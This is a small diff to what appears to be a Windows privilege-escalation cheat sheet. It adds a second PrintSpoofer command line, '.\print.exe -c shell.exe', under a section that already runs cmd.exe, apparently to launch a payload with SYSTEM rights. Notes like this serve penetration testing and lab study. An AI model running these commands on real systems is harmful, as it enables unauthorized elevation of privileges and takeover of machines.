@@ -185,6 +185,8 @@ schtasks /query /fo LIST /v
 ### PrintSpoofer
 ```powershell
 .\print.exe -i -c cmd.exe
+
+.\print.exe -c shell.exe
 ```
 
 ### JuicyPotato
